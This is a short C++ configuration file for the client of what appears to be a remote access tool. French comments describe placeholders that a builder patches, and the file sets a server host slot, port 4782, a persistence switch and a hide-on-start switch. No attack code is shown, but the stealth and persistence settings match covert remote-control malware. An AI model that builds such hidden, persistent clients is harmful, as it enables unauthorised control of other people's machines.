#include "Globals.h"

namespace rslm {
	namespace client {
		namespace config {

			// Placeholders pour le builder
			// Le "XXX..." est une marque que le builder cherchera et remplacera
			char g_serverHost[64] = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
			int g_serverPort = 4782;
			bool g_enablePersistence = false;
			bool g_hideOnStart = true;

		}// namespace config
	}// namespace client
}// namespace rslm